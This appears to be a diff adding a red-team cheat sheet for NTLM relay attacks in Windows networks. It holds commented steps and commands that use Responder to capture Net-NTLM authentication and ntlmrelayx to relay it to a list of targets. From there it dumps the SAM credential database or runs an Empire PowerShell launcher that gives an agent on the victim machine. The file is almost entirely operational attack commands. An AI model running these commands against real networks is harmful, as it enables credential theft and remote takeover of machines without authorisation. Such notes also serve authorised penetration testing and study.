@@ -1,0 +1,26 @@
+# Relaying in Windows Environments
+#
+# 1. We're using Responder to intercept authentication attempts (Net-NTLM
+#    hashes) via Multicast/Broadcast protocols;
+# 2. However, since we turned off Responder's SMB and HTTP servers and have
+#    ntlmrelayx.py running, those authentication attempts get automatically
+#    passed to ntlmrelayx.py's SMB and HTTP servers;
+# 3. ntlmrelayx.py takes over and relays those hashes to our target list. If
+#   the relay is successful it will dump the SAM database or execute a
+#   specified command, such as, our Empire launcher and give us
+#   an Empire Agent on the target machine;
+
+# Remember that the only difference between ntlmrelayx and smbrelayx
+# is that ntlmrelayx tries to relay not only to SMB; hence it's more general
+
+
+# Get the Net-NTLM Hashes
+# Remember to disable SMB and HTTP from the Responder.conf
+python Responder.py -I <interface> -r -d -w
+
+# Perform NTLM relays and dump SAM database
+ntlmrelayx.py -tf targets.txt
+
+# Perform NTLM relays and launch an empire powershell payload
+ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
+
